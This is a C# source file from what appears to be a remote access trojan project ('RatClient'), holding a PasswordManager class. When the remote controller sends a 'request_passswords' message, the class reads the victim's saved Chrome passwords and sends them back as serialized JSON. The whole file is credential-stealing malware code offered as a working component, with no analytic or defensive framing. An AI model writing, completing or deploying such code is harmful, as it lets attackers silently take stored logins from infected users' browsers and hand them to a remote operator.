using System;
using System.Web.Script.Serialization;
using RatClient.Features.Password.Chrome;

namespace RatClient.Features
{
    class PasswordManager
    {
        #region Variables
        public Chrome chrome = new Chrome();
        private readonly Action<object> SendJson;
        #endregion
        public PasswordManager(Action<dynamic> SendJson)
        {
            this.SendJson = SendJson;
            Program.MessageReceived += HandleMessage;
        }
        private void HandleMessage(dynamic message)
        {
            if (message["type"] == "request_passswords")
            {
                SendPasswords();
            }
        }
        public void SendPasswords()
        {
            var passwords = chrome.ReadPasswords();
            var serializedPasswords = new JavaScriptSerializer().Serialize(passwords);
            SendJson(new { type = "passwords", data = serializedPasswords });
        }
    }
}